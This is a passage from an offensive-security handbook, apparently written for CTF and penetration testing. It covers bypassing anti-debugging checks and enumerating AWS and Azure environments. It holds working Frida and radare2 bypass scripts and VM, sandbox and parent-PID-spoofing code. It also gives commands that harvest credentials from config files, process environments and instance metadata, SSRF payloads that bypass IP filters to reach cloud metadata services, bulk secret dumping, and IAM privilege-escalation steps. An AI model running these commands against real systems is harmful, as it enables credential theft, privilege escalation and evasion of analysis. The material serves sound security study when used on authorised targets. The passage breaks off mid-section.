    }, 'long', ['int', 'int', 'pointer', 'pointer']));
}

// Usage:
// frida -l bypass.js -f ./binary
```

### Timing-Based Detection Bypass

**Disable Timing Checks**

```bash
# Patch timing comparison
r2 -w <binary>
[0x00000000]> /c rdtsc

# Find comparison after timing calculation
[0x00000000]> pd 20 @ <rdtsc_address>

# Patch comparison to always succeed
[0x00000000]> wa jmp <success_branch> @ <comparison_address>
```

**Fake Time Values**

```python
# Frida script to manipulate rdtsc
Interceptor.attach(Module.findExportByName(null, 'clock'), {
    onLeave: function(retval) {
        // Return consistent value
        retval.replace(0);
    }
});

// Or hook rdtsc directly (requires assembler)
var code = Memory.alloc(Process.pageSize);
Memory.patchCode(code, 16, function(address) {
    var writer = new X86Writer(address);
    writer.putXorRegReg('eax', 'eax');
    writer.putXorRegReg('edx', 'edx');
    writer.putRet();
    writer.flush();
});
```

### Code Integrity Checks

**CRC/Hash Verification**

```c
// Binary calculates its own checksum
unsigned int calculate_crc(void *start, size_t length) {
    unsigned int crc = 0;
    unsigned char *data = (unsigned char *)start;
    for (size_t i = 0; i < length; i++) {
        crc = (crc >> 8) ^ crc_table[(crc ^ data[i]) & 0xFF];
    }
    return crc;
}

void check_integrity() {
    unsigned int crc = calculate_crc(code_start, code_length);
    if (crc != EXPECTED_CRC) {
        // Code has been modified
        exit(1);
    }
}
```

**Bypass Strategy**:

1. Find integrity check function
2. Calculate correct CRC/hash after patching
3. Patch the comparison value to match new hash
4. Or patch check to always succeed

**Self-Modifying Code Detection**

```c
// Mark code pages as read-only
mprotect(code_start, code_length, PROT_READ | PROT_EXEC);

// Any attempt to modify triggers SIGSEGV
// Exception handler checks if modification was legitimate
```

### Virtualization/Sandboxing Detection

**VM Detection** (common in malware analysis)

```c
// Check for VM artifacts
#include <windows.h>

BOOL detect_vm() {
    // Check registry keys
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;  // VirtualBox detected
    }
    
    // Check for VMware MAC address prefixes
    // 00:05:69, 00:0C:29, 00:1C:14, 00:50:56
    
    // CPUID checks for hypervisor bit
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        return TRUE;  // Hypervisor present
    }
    
    return FALSE;
}
```

**CPUID Hypervisor Detection**

```nasm
; Check CPUID leaf 1, bit 31 of ECX
mov     eax, 1
cpuid
test    ecx, 80000000h
jnz     vm_detected
```

**Sandbox Behavioral Detection**

```c
// Check for limited resources (sandbox characteristics)
BOOL detect_sandbox() {
    // Low CPU count
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    
    // Low RAM
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;  // < 2GB
    
    // Recent boot time (freshly started VM)
    DWORD uptime = GetTickCount();
    if (uptime < 600000) return TRUE;  // < 10 minutes
    
    // Few running processes
    // Check with CreateToolhelp32Snapshot
    
    return FALSE;
}
```

### Advanced Anti-Debugging Techniques

**Thread Hiding** (Windows)

```c
typedef NTSTATUS (WINAPI *pfnNtSetInformationThread)(
    HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG);

void hide_thread() {
    pfnNtSetInformationThread NtSIT = (pfnNtSetInformationThread)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    
    // ThreadHideFromDebugger = 0x11
    NtSIT(GetCurrentThread(), 0x11, NULL, 0);
    
    // After this, debugger can't receive events from this thread
}
```

**Parent Process PID Spoofing** (Windows)

```c
// Create process with spoofed parent PID
STARTUPINFOEXA si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size;
HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, spoofed_pid);

InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

UpdateProcThreadAttribute(si.lpAttributeList, 0, 
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
    &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcess(NULL, "child.exe", NULL, NULL, FALSE, 
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
    (LPSTARTUPINFO)&si, &pi);
```

**Debug Object Detection** (Windows)

```c
typedef NTSTATUS (WINAPI *pfnNtQueryObject)(
    HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);

BOOL detect_debug_object() {
    HANDLE hDebugObject = NULL;
    pfnNtQueryObject NtQO = (pfnNtQueryObject)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject");
    
    NTSTATUS status = NtQO(GetCurrentProcess(), 
        1,  // ObjectTypeInformation
        &hDebugObject, sizeof(hDebugObject), NULL);
    
    return hDebugObject != NULL;
}
```

### Comprehensive Anti-Debug Bypass Strategy

**1. Reconnaissance Phase**

```bash
# Identify all anti-debug mechanisms
r2 -A <binary>

# Search for API calls
[0x00000000]> /c call.*IsDebuggerPresent
[0x00000000]> /c call.*CheckRemoteDebuggerPresent
[0x00000000]> /c call.*NtQueryInformationProcess
[0x00000000]> /c ptrace

# Search for timing instructions
[0x00000000]> /c rdtsc
[0x00000000]> /c cpuid

# Search for exception handlers
[0x00000000]> /c AddVectoredExceptionHandler
[0x00000000]> /c int3

# Search for integrity checks
[0x00000000]> /c crc
[0x00000000]> /c sha
[0x00000000]> /c md5
```

**2. Create Bypass Script**

```python
#!/usr/bin/env python3
import r2pipe

r2 = r2pipe.open('./binary', flags=['-w'])

# Analyze
r2.cmd('aaa')

# Find and patch IsDebuggerPresent calls
idp_calls = r2.cmdj('aflj') # Get all functions
for call in r2.cmd('/c call.*IsDebuggerPresent').split('\n'):
    if call:
        addr = call.split()[0]
        # Patch: xor eax, eax; nop; nop
        r2.cmd(f'wa xor eax, eax; nop; nop @ {addr}')

# Patch conditional jumps after checks
for jnz in r2.cmd('/c jnz.*').split('\n'):
    if jnz and 'after_check' in jnz:  # Heuristic
        addr = jnz.split()[0]
        r2.cmd(f'wa jmp <target> @ {addr}')

# Save patched binary
r2.cmd('wc patched_binary')
r2.quit()

print("[+] Patching complete: patched_binary")
```

**3. Runtime Hooking**

```javascript
// comprehensive_bypass.js for Frida

// Windows API hooks
if (Process.platform === 'windows') {
    // IsDebuggerPresent
    var idp = Module.findExportByName('kernel32.dll', 'IsDebuggerPresent');
    Interceptor.replace(idp, new NativeCallback(function () {
        return 0;
    }, 'int', []));
    
    // CheckRemoteDebuggerPresent
    var crdp = Module.findExportByName('kernel32.dll', 'CheckRemoteDebuggerPresent');
    Interceptor.attach(crdp, {
        onEnter: function(args) {
            this.outPtr = args[1];
        },
        onLeave: function(retval) {
            Memory.writeU32(this.outPtr, 0);
        }
    });
    
    // NtQueryInformationProcess
    var ntqip = Module.findExportByName('ntdll.dll', 'NtQueryInformationProcess');
    Interceptor.attach(ntqip, {
        onLeave: function(retval) {
            retval.replace(0xC0000353);  // STATUS_PORT_NOT_SET
        }
    });
}

// Linux hooks
if (Process.platform === 'linux') {
    var ptrace_ptr = Module.findExportByName(null, 'ptrace');
    Interceptor.replace(ptrace_ptr, new NativeCallback(function (request, pid, addr, data) {
        if (request === 0) return 0;  // PTRACE_TRACEME always succeeds
        return -1;
    }, 'long', ['int', 'int', 'pointer', 'pointer']));
}

// Timing bypass
var clock_ptr = Module.findExportByName(null, 'clock');
if (clock_ptr) {
    Interceptor.replace(clock_ptr, new NativeCallback(function () {
        return 0;
    }, 'long', []));
}

console.log('[+] All anti-debug hooks installed');
```

```bash
# Run with comprehensive bypass
frida -l comprehensive_bypass.js -f ./binary --no-pause
```

---

**Critical Reverse Engineering Principles for CTF Success**:

1. **Start with Static Analysis**: Understand program structure before dynamic analysis
2. **String Analysis First**: Strings often reveal functionality and flags directly
3. **Function Flow**: Follow execution from entry point through key functions
4. **Pattern Recognition**: Learn common algorithmic patterns (crypto, encoding, checks)
5. **Iterative Approach**: Combine static analysis, dynamic debugging, and patching
6. **Tool Diversity**: No single tool solves everything - use multiple approaches

**Important Subtopics for Advanced Study**:

- **Symbolic Execution** (angr, KLEE for automated path exploration)
- **Dynamic Binary Instrumentation** (DBI with Pin, DynamoRIO)
- **Emulation-Based Analysis** (Unicorn Engine for CPU emulation)
- **Format String Vulnerabilities** (exploitation during reversing)
- **Return-Oriented Programming (ROP)** (gadget finding and chain construction)
- **Kernel Debugging** (WinDbg, kernel modules, driver analysis)
- **Mobile Reverse Engineering** (Android APK, iOS IPA analysis)
- **Firmware Analysis** (embedded systems, UART/JTAG debugging)

done

---

# Cloud & Container Enumeration

Cloud and container environments present unique enumeration challenges with different authentication models, API-driven architectures, and ephemeral resources. Successful enumeration requires understanding cloud-specific IAM models, metadata services, storage configurations, and container runtime environments.

## AWS Enumeration

Amazon Web Services (AWS) enumeration focuses on identifying misconfigurations in IAM policies, S3 buckets, EC2 instances, Lambda functions, and other services. Access typically starts with compromised access keys or instance metadata.

### AWS Credential Discovery

**Credential Locations**

```bash
# AWS CLI configuration files
cat ~/.aws/credentials
cat ~/.aws/config

# Environment variables
env | grep AWS
printenv | grep -i aws

# Common application config files
find / -name "*.aws" 2>/dev/null
find / -name "*credentials*" 2>/dev/null | grep -i aws
grep -r "AKIA" /var/www/ 2>/dev/null  # Access Key ID pattern
grep -r "aws_access_key_id" /home/ 2>/dev/null

# Docker environment variables
docker inspect <container_id> | grep -i aws

# Kubernetes secrets
kubectl get secrets --all-namespaces
kubectl get secret <secret_name> -o yaml | base64 -d

# Process environment variables (if you have access)
cat /proc/*/environ | tr '\0' '\n' | grep AWS

# Historical bash commands
cat ~/.bash_history | grep aws
cat ~/.zsh_history | grep aws
```

**AWS Access Key Format**

```
# Access Key ID: Starts with AKIA (long-term) or ASIA (temporary/session)
AKIAIOSFODNN7EXAMPLE

# Secret Access Key: 40-character base64 string
wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Session Token (for temporary credentials): Long base64 string
# Required alongside ASIA keys
```

**Testing Credentials**

```bash
# Configure AWS CLI
aws configure
# AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Default region: us-east-1
# Default output format: json

# Or use environment variables
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_DEFAULT_REGION=us-east-1

# For temporary credentials (session token)
export AWS_SESSION_TOKEN=FwoGZXIvYXdzEBYaDG...

# Verify credentials work
aws sts get-caller-identity

# Output shows:
# - Account ID
# - User/Role ARN
# - User ID
```

### EC2 Instance Metadata Service (IMDS)

**IMDS Overview:** EC2 instances can access metadata and temporary credentials via a special endpoint. Two versions exist: IMDSv1 (unauthenticated) and IMDSv2 (session-based).

**IMDSv1 Enumeration (Legacy)**

```bash
# Test if IMDS is accessible
curl http://169.254.169.254/latest/meta-data/

# Common metadata endpoints
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/instance-type
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/security-groups
curl http://169.254.169.254/latest/meta-data/placement/availability-zone

# User data (may contain sensitive information)
curl http://169.254.169.254/latest/user-data

# IAM role credentials (most critical)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get role name, then retrieve credentials
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Output includes:
# - AccessKeyId
# - SecretAccessKey
# - Token
# - Expiration
```

**IMDSv2 Enumeration (Token-Based)**

```bash
# IMDSv2 requires a session token obtained via PUT request

# Get session token (TTL in seconds, max 21600)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token in subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# IAM credentials with IMDSv2
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Identity document (signed metadata)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
```

**SSRF to IMDS**

```bash
# If you have SSRF vulnerability, target IMDS
# Example payloads:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Bypass attempts if IP filtering exists:
http://169.254.169.254.nip.io/latest/meta-data/
http://169.254.169.254.xip.io/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/
http://0xA9FEA9FE/latest/meta-data/  # Hex representation of 169.254.169.254
http://2852039166/latest/meta-data/  # Decimal representation

# DNS rebinding
# Use tools like Singularity or DNSRebinder
```

### AWS IAM Enumeration

**Identity Information**

```bash
# Current identity (who am I?)
aws sts get-caller-identity

# Account information
aws sts get-account-authorization-details

# List access keys for current user (if permitted)
aws iam list-access-keys

# User information (requires username)
aws iam get-user
aws iam get-user --user-name <username>

# List users (if permitted)
aws iam list-users

# List groups
aws iam list-groups

# List roles
aws iam list-roles

# Role details
aws iam get-role --role-name <role_name>
```

**Permission Enumeration**

```bash
# List attached user policies
aws iam list-attached-user-policies --user-name <username>

# List inline user policies
aws iam list-user-policies --user-name <username>

# Get specific policy document
aws iam get-user-policy --user-name <username> --policy-name <policy_name>

# List attached role policies
aws iam list-attached-role-policies --role-name <role_name>

# List inline role policies
aws iam list-role-policies --role-name <role_name>

# Get role policy document
aws iam get-role-policy --role-name <role_name> --policy-name <policy_name>

# List all policies (if permitted)
aws iam list-policies --scope Local  # Customer managed
aws iam list-policies --scope AWS    # AWS managed

# Get policy version details
aws iam get-policy-version --policy-arn <arn> --version-id <version>
```

**Automated Permission Enumeration**

```bash
# enumerate-iam.py - discovers permissions via brute force testing
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt

# Run enumeration
python3 enumerate-iam.py --access-key AKIA... --secret-key wJalr...

# Output shows allowed/denied actions across services

# Pacu - AWS exploitation framework
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Within Pacu:
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run iam__bruteforce_permissions

# Prowler - AWS security assessment
git clone https://github.com/prowler-cloud/prowler.git
cd prowler
pip install -r requirements.txt

# Run assessment
python prowler.py -M csv

# ScoutSuite - multi-cloud security auditing
pip install scoutsuite
scout aws --access-key-id AKIA... --secret-access-key wJalr...
```

### S3 Bucket Enumeration

**Public Bucket Discovery**

```bash
# Test if bucket exists (unauthenticated)
curl -I https://bucket-name.s3.amazonaws.com
curl -I https://s3.amazonaws.com/bucket-name

# List bucket contents (if public read)
aws s3 ls s3://bucket-name/ --no-sign-request
curl https://bucket-name.s3.amazonaws.com/

# List with credentials
aws s3 ls s3://bucket-name/

# Download entire bucket
aws s3 sync s3://bucket-name/ ./local-directory/ --no-sign-request

# Bucket permissions check
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name
aws s3api get-public-access-block --bucket bucket-name

# List all buckets (authenticated)
aws s3 ls
aws s3api list-buckets
```

**S3 Bucket Name Bruteforcing**

```bash
# Common naming patterns
company-name
company-name-backups
company-name-logs
company-name-data
company-name-dev
company-name-prod
company-name-assets
company-name-static
subdomain.company.com
companyname

# S3Scanner - find public S3 buckets
pip3 install s3scanner
s3scanner scan --buckets-file bucket_names.txt

# Output shows:
# - exists/not exists
# - permissions (read, write, list)

# Lazys3 - brute force S3 buckets
git clone https://github.com/nahamsec/lazys3.git
ruby lazys3.rb company-name

# S3Recon - automated S3 enumeration
git clone https://github.com/clarketm/s3recon.git
python3 s3recon.py -w wordlist.txt -o output.json

# Mass S3 bucket testing
cat bucket_names.txt | while read bucket; do
    echo -n "$bucket: "
    curl -s -I "https://$bucket.s3.amazonaws.com/" | grep "HTTP/"
done
```

**S3 Bucket Permissions Testing**

```bash
# Test read access
aws s3 ls s3://bucket-name/ --no-sign-request

# Test write access (creates test file)
echo "test" > test.txt
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request

# If write succeeds, verify upload
aws s3 ls s3://bucket-name/ --no-sign-request | grep test.txt

# Test read ACL permission
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# Test write ACL permission (dangerous - modifies bucket)
# aws s3api put-bucket-acl --bucket bucket-name --acl public-read --no-sign-request
```

### EC2 Enumeration

**Instance Discovery**

```bash
# List all EC2 instances
aws ec2 describe-instances

# List instances with specific filters
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running"

# Get specific instance details
aws ec2 describe-instances --instance-ids i-1234567890abcdef0

# Extract useful information
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PrivateIpAddress,PublicIpAddress,KeyName]' --output table

# List security groups
aws ec2 describe-security-groups

# Security group details (inbound/outbound rules)
aws ec2 describe-security-groups --group-ids sg-1234567890abcdef0

# List key pairs
aws ec2 describe-key-pairs

# List AMIs owned by account
aws ec2 describe-images --owners self

# List snapshots
aws ec2 describe-snapshots --owner-ids self

# Public snapshots (potential data exposure)
aws ec2 describe-snapshots --filters "Name=owner-id,Values=<account_id>" --query 'Snapshots[?Public==`true`]'
```

**Snapshot Exploitation**

```bash
# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-1234567890abcdef0 --availability-zone us-east-1a

# Attach volume to compromised instance
aws ec2 attach-volume --volume-id vol-1234567890abcdef0 --instance-id i-1234567890abcdef0 --device /dev/sdf

# Mount and access (from within instance)
sudo mkdir /mnt/snapshot
sudo mount /dev/xvdf1 /mnt/snapshot
ls -la /mnt/snapshot

# Search for sensitive data
find /mnt/snapshot -name "*.pem" -o -name "*.key" -o -name "*credential*" -o -name "*password*"
grep -r "BEGIN RSA PRIVATE KEY" /mnt/snapshot/
```

### Lambda Enumeration

**Function Discovery**

```bash
# List Lambda functions
aws lambda list-functions

# Function details
aws lambda get-function --function-name function-name

# Download function code
aws lambda get-function --function-name function-name --query 'Code.Location' --output text | xargs curl -o function.zip

# Unzip and analyze
unzip function.zip
find . -type f -exec cat {} \; | grep -i "password\|secret\|api_key\|token"

# List function environment variables
aws lambda get-function-configuration --function-name function-name --query 'Environment.Variables'

# Invoke function (if permitted)
aws lambda invoke --function-name function-name output.json
cat output.json

# List event source mappings
aws lambda list-event-source-mappings --function-name function-name

# Check function policy (who can invoke)
aws lambda get-policy --function-name function-name
```

### RDS Enumeration

**Database Discovery**

```bash
# List RDS instances
aws rds describe-db-instances

# Instance details
aws rds describe-db-instances --db-instance-identifier database-1

# Extract connection information
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,Endpoint.Port,MasterUsername]' --output table

# List snapshots
aws rds describe-db-snapshots

# Public snapshots (potential exposure)
aws rds describe-db-snapshots --include-public --query 'DBSnapshots[?PubliclyAccessible==`true`]'

# List security groups
aws rds describe-db-security-groups

# Check if publicly accessible
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`]'
```

### Secrets Manager Enumeration

**Secret Discovery**

```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id secret-name

# Output contains plaintext or SecretString
aws secretsmanager get-secret-value --secret-id secret-name --query 'SecretString' --output text

# Batch retrieval
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | while read secret; do
    echo "Secret: $secret"
    aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' --output text
    echo "---"
done
```

### AWS CLI Enumeration Scripts

**Comprehensive AWS Enumeration**

```bash
#!/bin/bash
# aws_enum.sh - Basic AWS enumeration script

echo "[*] Starting AWS Enumeration"
echo "=========================================="

# Identity
echo "[+] Caller Identity:"
aws sts get-caller-identity

# S3 Buckets
echo -e "\n[+] S3 Buckets:"
aws s3 ls

# EC2 Instances
echo -e "\n[+] EC2 Instances:"
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table

# Security Groups
echo -e "\n[+] Security Groups:"
aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName]' --output table

# IAM Users
echo -e "\n[+] IAM Users:"
aws iam list-users --query 'Users[*].[UserName]' --output table

# IAM Roles
echo -e "\n[+] IAM Roles:"
aws iam list-roles --query 'Roles[*].[RoleName]' --output table

# Lambda Functions
echo -e "\n[+] Lambda Functions:"
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime]' --output table

# RDS Instances
echo -e "\n[+] RDS Instances:"
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible]' --output table

# Secrets
echo -e "\n[+] Secrets Manager:"
aws secretsmanager list-secrets --query 'SecretList[*].[Name]' --output table

# ECS Clusters
echo -e "\n[+] ECS Clusters:"
aws ecs list-clusters

# CloudFormation Stacks
echo -e "\n[+] CloudFormation Stacks:"
aws cloudformation list-stacks --query 'StackSummaries[?StackStatus!=`DELETE_COMPLETE`].[StackName,StackStatus]' --output table

echo -e "\n[*] Enumeration Complete"
```

### AWS Privilege Escalation Paths

**Common Escalation Techniques:**

```bash
# 1. iam:CreateAccessKey - create keys for other users
aws iam create-access-key --user-name admin-user

# 2. iam:AttachUserPolicy - attach admin policy to self
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:PutUserPolicy - create inline admin policy
aws iam put-user-policy --user-name current-user --policy-name admin --policy-document file://admin-policy.json

# 4. iam:UpdateAssumeRolePolicy - modify trust policy to assume role
aws iam update-assume-role-policy --role-name target-role --policy-document file://trust-policy.json

# 5. lambda:UpdateFunctionCode - modify Lambda with admin role
aws lambda update-function-code --function-name admin-function --zip-file fileb://malicious.zip

# 6. ec2:RunInstances with PassRole - launch instance with privileged role
aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=AdminRole

# 7. sts:AssumeRole - assume privileged role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name attacker
```

## Azure Enumeration

Microsoft Azure uses Azure Active Directory (AAD) for identity management and Resource Manager for resource access. Enumeration focuses on tenant discovery, user/group enumeration, resource access, and storage configurations.

### Azure Credential Discovery

**Credential Locations**

```bash
# Azure CLI configuration
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json
cat ~/.azure/clouds.config
cat ~/.azure/config

# PowerShell credentials
ls -la ~/.Azure/
cat ~/.Azure/TokenCache.dat
cat ~/.Azure/AzureRmContext.json

# Environment variables
env | grep AZURE
printenv | grep -i azure

# Application configuration files
find / -name "*.azure" 2>/dev/null
grep -r "client_secret" /var/www/ 2>/dev/null
grep -r "tenant_id" /home/ 2>/dev/null

# Docker/Kubernetes
docker inspect <container_id> | grep -i azure
kubectl get secrets --all-namespaces
```

**Azure Credentials Types:**

```
# Service Principal (Application)
- Application (client) ID: GUID format
- Directory (tenant) ID: GUID format
- Client Secret: String value

# Managed Identity
- Accessed via Azure Instance Metadata Service (IMDS)
- No static credentials needed

# User Credentials
- Username/email
- Password or certificate
```

**Testing Azure Credentials**

```bash
# Azure CLI login with service principal
az login --service-principal \
  --username <client_id> \
  --password <client_secret> \
  --tenant <tenant_id>

# Verify access
az account show

# List subscriptions
az account list

# PowerShell login
Connect-AzAccount -ServicePrincipal \
  -Credential (Get-Credential) \
  -Tenant <tenant_id>

# Check context
Get-AzContext

# Managed Identity login (from Azure VM)
az login --identity
```

### Azure Instance Metadata Service (IMDS)

**Azure IMDS Enumeration**

```bash
# Azure IMDS endpoint (requires specific header)
# Version must be specified

# Get access token for Azure Resource Manager
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Output includes:
# - access_token (JWT)
# - expires_on
# - resource
# - token_type

# Instance metadata
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Specific metadata fields
curl -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
curl -H Metadata:true "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"

# Parse access token
TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true | jq -r '.access_token')

# Use token with Azure REST API
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Managed Identity Exploitation**

```bash
# Get token for different resources

# Azure Resource Manager
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Azure Key Vault
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H Metadata:true

# Azure Storage
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/' -H Metadata:true

# Microsoft Graph
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' -H Metadata:true

# Azure SQL Database
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/' -H Metadata:true
```

### Azure AD Enumeration

**Tenant Discovery**

```bash
# Discover tenant from domain
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@company.com&json=1"

# OpenID configuration (reveals tenant ID)
curl "https://login.microsoftonline.com/company.com/.well-known/openid-configuration"

# AAD Graph API tenant info
curl "https://graph.windows.net/company.com?api-version=1.6"

# Extract tenant ID from response
```

**User Enumeration**

```bash
# Azure CLI user enumeration
az ad user list

# Specific user
az ad user show --id user@company.com

# User details with groups
az ad user get-member-groups --id user@company.com

# Search users
az ad user list --filter "startswith(displayName,'John')"

# PowerShell enumeration
Get-AzADUser
Get-AzADUser -UserPrincipalName user@company.com
Get-AzADUser -SearchString "admin"

# Microsoft Graph API (with token)
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users"

# Specific user
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users/user@company.com"
```

**Group Enumeration**

```bash
# List all groups
az ad group list

# Group members
az ad group member list --group "GroupName"

# User's group memberships
az ad user get-member-groups --id user@company.com

# PowerShell
Get-AzADGroup
Get-AzADGroupMember -GroupDisplayName "Administrators"

# Graph API
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups"

# Group members
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups/{group-id}/members"
```

**Service Principal Enumeration**

```bash
# List service principals (applications)
az ad sp list

# Specific service principal
az ad sp show --id <app_id>

# Service principal credentials
az ad sp credential list --id <app_id>

# PowerShell
Get-AzADServicePrincipal
Get-AzADServicePrincipal -SearchString "app"

# Graph API
curl -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/servicePrincipals"
```

**Role Assignment Enumeration**

```bash
# List role assignments
az role assignment list

# Role assignments for specific user
az role assignment list --assignee user@company.com

# Role assignments for subscription
az role assignment list --subscription <subscription_id>

# Role definitions
az role definition list

# PowerShell
Get-AzRoleAssignment
Get-AzRoleAssignment -SignInName user@company.com
Get-AzRoleDefinition
```

### Azure Resource Enumeration

**Subscription and Resource Group Discovery**

```bash
# List subscriptions
az account list

# Set active subscription
az account set --subscription <subscription_id>

# List resource groups
az group list

# Resources in resource group
az resource list --resource-group <resource_group_name>

# All resources in subscription
az resource list

# PowerShell
Get-AzSubscription
Get-AzResourceGroup
Get-AzResource
```

**Virtual Machine Enumeration**

```bash
# List VMs
az vm list

# VM details
az vm show --resource-group <rg_name> --name <vm_name>

# VM sizes and locations
az vm list-sizes --location eastus

# List VM extensions
az vm extension list --resource-group <rg_name> --vm-name <vm_name>

# Run command on VM (if permitted)
az vm run-command invoke --resource-group <rg_name> --name <vm_name> --command-id RunShellScript --scripts "whoami"

# PowerShell
Get-AzVM
Get-AzVM -ResourceGroupName <rg_name> -Name <vm_name>
```

**Storage Account Enumeration**

```bash
# List storage accounts
az storage account list

# Account details
az storage account show --name <storage_account_name> --resource-group <rg_name>

# Account keys (if permitted)
az storage account keys list --account-name <storage_account_name> --resource-group <rg_name>

# List containers (requires account key or SAS token)
az storage container list --account-name <storage_account_name> --account-key <key>

# List blobs in container
az storage blob list --account-name <storage_account_name> --container-name <container_name> --account-key <key>

# Download blob
az storage blob download --account-name <storage_account_name> --container-name <container_name> --name <blob_name> --file output.txt --account-key <key>

# Check public access
curl "https://<storage_account_name>.blob.core.windows.net/<container_name>?restype=container&comp=list"

# PowerShell
Get-AzStorageAccount
Get-AzStorageContainer -Context $ctx
Get-AzStorageBlob -Container <container_name> -Context $ctx
```

**Key Vault Enumeration**

```bash
# List key vaults
az keyvault list

# Show key vault properties
az keyvault show --name <vault_name>

# List secrets (requires permissions)
